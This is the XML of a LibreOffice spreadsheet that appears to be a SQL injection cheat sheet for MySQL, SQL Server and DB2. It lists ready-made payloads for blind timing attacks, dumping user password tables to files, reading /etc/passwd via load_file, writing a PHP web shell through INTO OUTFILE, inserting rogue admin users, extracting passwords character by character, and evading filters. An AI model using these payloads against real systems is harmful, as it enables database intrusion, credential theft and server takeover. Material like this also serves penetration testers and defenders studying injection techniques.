        <table:table-row table:style-name="ro3">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4"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>4 – Escape errors</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>a';SET QUOTED_IDENTIFIER OFF;select * FROM OPENROWSET("SQLOLEDB","";"sa";"password","SELECT 1");--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">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table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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2">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2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HASH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MD5(‘abc’);</text:p>
            <text:p>SHA1(‘abc’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK / SLEEP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK(10000000,ENCODE('abc','123')); #~5s on localhost</text:p>
            <text:p>BENCHMARK(1000000,MD5(CHAR(116))); #~7s on localhost</text:p>
            <text:p>BENCHMARK(10000000,MD5(CHAR(116))); #~70s on localhost</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Timeout / sleep IF user exists</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>IF( user = 'root', BENCHMARK(1000000,MD5( 'x' )),NULL) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write to files without single quotes (chars = ‘admin’)</text:p>
            <text:p>Must specify new file and give correct path name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4">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4"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write userdb into outfile</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘/tmp/passwd’;</text:p>
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘../../web/dir/file.txt’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve etc/passwd, put into field, insert user, load data</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT load_file(‘...’) INTO OUTFILE ‘...’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Encoding load(ed)_file. Can decrypt hex with PHP Charset Encoder or other</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT hex(load_file(‘...’)) INTO OUTFILE ‘…’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Write whatever you want into an arbitrary file (shell.php anyone?)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT ‘code’,null INTO OUTFILE ‘../../web/server/dir/file.php’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>INTO DUMPFILE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Does not split chars between data like INTO OUTFILE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CHAR (chars = ‘a’)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>CHAR(39,97,39)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INSERT</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>INSERT INTO login SET user = ‘r00t’,pass=’abc’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password reset email capability? Update user email address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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17">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2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Prefixes. Use prefixes and whitespaces as often as you want</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>“”</text:p>
            <text:p>+</text:p>
            <text:p>-</text:p>
            <text:p>~</text:p>
            <text:p>!</text:p>
            <text:p>@</text:p>
            <text:p>“ “</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>whitespaces. Use prefixes and whitespaces as often as you want</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>%20 %09 %0a %0b %0c %0d %a0 /**/</text:p>
            <text:p/>
            <text:p>Ex: ‘or+(1)sounds/**/like“1“–%a0-</text:p>
            <text:p>Ex: ‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>comments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*</text:p>
            <text:p>#</text:p>
            <text:p>%23</text:p>
            <text:p>–</text:p>
            <text:p>;%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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3">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4">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6">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15">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2">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15">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4">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5">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table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>6 – Older Stuff</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing PHP functions</text:p>
            <text:p>(MySQL 4.1.x before 4.1.20 and 5.0.x)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>WHERE x = 0xbf27admin 0xbf27</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">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4"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4">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8">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4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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5">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4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host, user, password FROM mysql.user;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro11">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5">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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current DB</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT database()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">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3">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3">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2">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3">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15">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2">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2">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2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CONCAT(‘A’,'B’); #returns AB</text:p>
            <text:p>SELECT CONCAT(‘A’,'B’,'C’); # returns ABC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT if(1=1,’foo’,'bar’); — returns ‘foo’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Case Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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2">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2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local file access (priv)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@hostname;</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2">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20">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ext:p>PARAMETERS</text:p>
            <text:p>PARTITIONS</text:p>
            <text:p>PLUGINS</text:p>
            <text:p>PROCESSLIST</text:p>
            <text:p>PROFILING</text:p>
            <text:p>REFERENTIAL_CONSTRAINTS</text:p>
            <text:p>ROUTINES</text:p>
            <text:p>SCHEMATA</text:p>
            <text:p>SCHEMA_PRIVILEGES</text:p>
            <text:p>STATISTICS</text:p>
            <text:p>TABELS</text:p>
            <text:p>TABLESPACES</text:p>
            <text:p>TABLE_CONSTRAINTS</text:p>
            <text:p>TABLE_PRIVILEGES</text:p>
            <text:p>TRIGGERS</text:p>
            <text:p>USER_PRIVILEGES</text:p>
            <text:p>VIEWS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">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7">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>White spaces using paranthesis</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1-- -)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>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1">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3">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4" office:value-type="string" calcext:value-type="string">
            <text:p>(coalesce(length(load_file(0x2F6574632F706173737764)),1))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">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2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check char of pass, one by one (or with a specific username)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1&amp;&amp;mid(pass,1,1)=(0x61);%00</text:p>
            <text:p>1||1=1&amp;&amp;name=0x61646D696E&amp;&amp;mid(pass,1,1)=0x61;%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">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2">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22">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23">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7">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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String separation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT/*/'a'/*/ 'd'/*/ 'm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7">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5">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3">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3">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1" table:number-rows-repeated="1048381">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
      </table:table>
      <table:table table:name="SQL Server" table:style-name="ta1">
        <table:table-column table:style-name="co6" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co2" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro24">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
      <table:table table:name="DB2" table:style-name="ta1">
        <table:table-column table:style-name="co7" table:default-cell-style-name="ce4"/>
        <table:table-column table:style-name="co8" table:default-cell-style-name="ce4"/>
        <table:table-row table:style-name="ro5">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3">Select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo</text:span></text:p>
            <text:p><text:span text:style-name="T3">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3">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3">Select system_user from sysibm.sysdummy1</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">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3">Select grantee from syscat.dbauth — incomplete results</text:span></text:p>
            <text:p><text:span text:style-name="T3">Select distinct(definer) from syscat.schemata — more accurate</text:span></text:p>
            <text:p><text:span text:style-name="T3">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3">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2">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2">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2">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2">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2">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2">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2">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2">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2">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12">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6">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text:span text:style-name="T2"/></text:p>
            <text:p><text:span text:style-name="T2">Select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) — Same but without repeated elements</text:span></text:p>
            <text:p><text:span text:style-name="T3"/></text:p>
            <text:p><text:span text:style-name="T3">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2">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2">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23">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3">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7:26:40.2043524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02-24T20:31:07.647158280</dc:date>
    <meta:editing-duration>PT5H28M24S</meta:editing-duration>
    <meta:editing-cycles>11</meta:editing-cycles>
    <meta:generator>LibreOffice/6.0.1.1$Linux_X86_64 LibreOffice_project/00m0$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="4" meta:cell-count="492" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>